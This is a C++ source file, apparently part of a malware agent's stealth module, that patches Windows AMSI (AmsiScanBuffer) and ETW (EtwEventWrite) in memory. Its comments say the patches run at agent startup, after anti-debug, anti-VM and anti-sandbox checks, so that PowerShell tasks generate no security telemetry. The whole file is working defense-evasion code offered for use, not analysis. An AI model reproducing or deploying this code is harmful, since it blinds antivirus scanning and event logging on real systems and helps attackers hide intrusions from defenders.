// AMSI + ETW patching (B5).
//
// Both APIs are neutered by overwriting the prologue of their entry points
// with `ret` (or `mov eax, error; ret` for AMSI). The patches are applied at
// agent startup, after the anti-debug / anti-VM / anti-sandbox checks pass
// and before the first HTTP request is made. This stops `powershell.exe`
// task invocations from generating AMSI / ETW telemetry.
//
// Both patches are designed to leave no big RWX window. The pages are made
// writable, the patch is written, the page is then re-protected back to RX
// before the function is allowed to return.

#include "build_config.h"

#if defined(_WIN32) && NAGOMIO_STEALTH

#include <windows.h>
#include <psapi.h>
#include <cstring>

namespace nagomio_evade {

namespace {

bool patch_function(BYTE* target, const BYTE* patch, size_t patch_size) {
    DWORD old_protect = 0;
    if (!VirtualProtect(target, patch_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
        return false;
    }
    std::memcpy(target, patch, patch_size);
    DWORD discard = 0;
    VirtualProtect(target, patch_size, old_protect, &discard);
    FlushInstructionCache(GetCurrentProcess(), target, patch_size);
    return true;
}

} // namespace

void patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    auto fn = reinterpret_cast<BYTE*>(GetProcAddress(amsi, "AmsiScanBuffer"));
    if (!fn) return;
    // Patch the prologue with `mov eax, 0x80070057; ret`. AMSI treats
    // E_INVALIDARG as "not a threat" so script content will pass through.
    //
    //   B8 57 00 07 80  -> mov eax, 0x80070057
    //   C3              -> ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    patch_function(fn, patch, sizeof(patch));
}

void patch_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    auto fn = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, "EtwEventWrite"));
    if (!fn) return;
    // Replace the entire prologue with a single `ret`.
    BYTE patch[] = { 0xC3 };
    patch_function(fn, patch, sizeof(patch));
}

void apply_all() {
    patch_amsi();
    patch_etw();
}

} // namespace nagomio_evade

#endif
